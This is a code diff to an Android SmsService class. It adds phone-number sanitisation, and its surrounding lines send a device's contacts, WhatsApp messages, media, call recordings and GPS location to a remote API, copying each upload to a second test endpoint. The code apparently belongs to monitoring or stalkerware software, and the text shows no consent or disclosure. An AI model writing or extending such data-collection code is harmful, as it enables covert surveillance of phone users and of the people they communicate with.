@@ -88,8 +88,8 @@ public class SmsService {
         initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(1);
-        smsAPI.postContacts("ContactList",userMob,contactId,contactNo,contactName,smsCallback);
-        testSmsAPI.postContacts("ContactList",userMob,contactId,contactNo,contactName,smsCallback);
+        smsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
+        testSmsAPI.postContacts("ContactList",removeSpChars(userMob),contactId,removeSpChars(contactNo),contactName,smsCallback);
     }
     public void sendSms(String userMob,String msgId,String msgDate,String msgFrom,String to,String msgText){
         initSMSAPI();
@@ -103,32 +103,32 @@ public class SmsService {
         initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(context,3,notifications);
-        smsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
-        testSmsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+        smsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+        testSmsAPI.postWhatsApp("WHATSAPP",removeSpChars(userMob),msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
     public void sendMedia(File file,String userMobile){
         initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(4);
-        smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
-        testSmsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+        smsAPI.postWhatsAppMedia("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+        testSmsAPI.postWhatsAppMedia("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
     }
 
     public void sendCallrecordings(File file,String userMobile){
         initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(5, file);
-        smsAPI.postCallRecord("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
-        testSmsAPI.postCallRecord("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
+        smsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
+        testSmsAPI.postCallRecord("UPLOAD",removeSpChars(userMobile),new TypedFile(getMimeType(file.getAbsolutePath()),file),"CALLRECORD", smsCallback);
     }
 
     public static String removeSpChars(String s){
-        s = s.replace("+","");
-        s = s.replace("-","");
-        s = s.replace("(","");
-        s = s.replace(")","");
-        s = s.replace(" ","");
+        s = s.replaceAll("\\+","");
+        s = s.replaceAll("-","");
+        s = s.replaceAll("\\(","");
+        s = s.replaceAll("\\)","");
+        s = s.replaceAll(" ","");
         return s;
     }
     public static String getMimeType(String url) {
@@ -144,7 +144,7 @@ public class SmsService {
         initSMSAPI();
         initSecondSMSAPI();
         SmsCallback smsCallback = new SmsCallback(6);
-        smsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),userMobile, smsCallback);
-        testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),userMobile, smsCallback);
+        smsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
+        testSmsAPI.postLocation("LOCATION",String.valueOf(Constant.latitude),String.valueOf(Constant.longitude),removeSpChars(userMobile), smsCallback);
     }
 }
